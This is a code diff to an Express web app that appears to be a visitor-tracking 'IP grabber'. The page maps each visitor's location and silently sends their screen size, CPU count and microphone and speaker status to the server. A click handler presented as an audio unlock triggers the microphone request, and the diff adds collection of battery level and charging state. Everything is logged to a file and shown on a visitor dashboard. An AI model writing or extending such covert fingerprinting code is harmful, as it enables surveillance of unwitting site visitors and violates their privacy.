@@ -100,7 +100,7 @@ app.get("/", async (req, res) => {
   L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
   L.marker([${lat}, ${lon}]).addTo(map).bindPopup("Visitor").openPopup();
 
-  // AUDIO autoplay after interaction
+  // AUDIO unlock
   const audio = document.getElementById("sound");
   const unlock = () => {
     audio.play().catch(()=>{});
@@ -113,7 +113,6 @@ app.get("/", async (req, res) => {
   const screenSize = screen.width + "x" + screen.height;
   const cpu = navigator.hardwareConcurrency || "Unknown";
 
-  // SEND DATA
   fetch("/log-extra", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
@@ -124,14 +123,13 @@ app.get("/", async (req, res) => {
     })
   });
 
-  // AUDIO DEVICE DETECTION
+  // AUDIO DEVICES
   async function detectAudioDevices() {
     let mic = "Not allowed";
     let speakers = "Unknown";
 
     try {
       await navigator.mediaDevices.getUserMedia({ audio: true });
-
       const devices = await navigator.mediaDevices.enumerateDevices();
 
       mic = devices.some(d => d.kind === "audioinput") ? "Yes" : "No";
@@ -150,6 +148,30 @@ app.get("/", async (req, res) => {
   }
 
   document.addEventListener("click", detectAudioDevices, { once: true });
+
+  // BATTERY
+  async function getBatteryInfo() {
+    let level = "Not supported";
+    let charging = "Unknown";
+
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        level = Math.round(battery.level * 100) + "%";
+        charging = battery.charging ? "Yes" : "No";
+      }
+    } catch (e) {
+      level = "Error";
+    }
+
+    fetch("/log-battery", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({ level, charging })
+    });
+  }
+
+  document.addEventListener("click", getBatteryInfo, { once: true });
 </script>
 
 </body>
@@ -160,16 +182,21 @@ app.get("/", async (req, res) => {
 // ================= LOG EXTRA =================
 app.post("/log-extra", (req, res) => {
   const { log, screen, cpu } = req.body;
-  const finalLog = `${log}|${screen}|CPU:${cpu}\n`;
-  fs.appendFileSync(__dirname + "/ips.txt", finalLog);
+  fs.appendFileSync(__dirname + "/ips.txt", `${log}|${screen}|CPU:${cpu}\n`);
   res.sendStatus(200);
 });
 
 // ================= AUDIO LOG =================
 app.post("/log-audio", (req, res) => {
   const { mic, speakers } = req.body;
-  const log = `Audio | Mic: ${mic} | Speakers: ${speakers}\n`;
-  fs.appendFileSync(__dirname + "/ips.txt", log);
+  fs.appendFileSync(__dirname + "/ips.txt", `Audio | Mic:${mic} | Speakers:${speakers}\n`);
+  res.sendStatus(200);
+});
+
+// ================= BATTERY LOG =================
+app.post("/log-battery", (req, res) => {
+  const { level, charging } = req.body;
+  fs.appendFileSync(__dirname + "/ips.txt", `Battery | ${level} | Charging:${charging}\n`);
   res.sendStatus(200);
 });
 
@@ -182,14 +209,11 @@ app.get("/dashboard", (req, res) => {
     const lines = data.trim().split("\n").reverse();
 
     lines.forEach(line => {
-      // ❌ REMOVE BAD LINES
       if (
         line.includes("127.0.0.1") ||
         line.includes("undefined") ||
         !line.includes("|")
-      ) {
-        return;
-      }
+      ) return;
 
       const parts = line.split("|");
 
@@ -206,8 +230,7 @@ app.get("/dashboard", (req, res) => {
           <td>${parts[7]}</td>
           <td>${parts[8]}</td>
           <td>${parts[9]}</td>
-        </tr>
-        `;
+        </tr>`;
       }
     });
 
@@ -226,10 +249,8 @@ app.get("/dashboard", (req, res) => {
       th { background:#667eea; color:white; }
     </style>
   </head>
-
   <body>
     <h2>Visitor Dashboard</h2>
-
     <table>
       <tr>
         <th>IP</th>
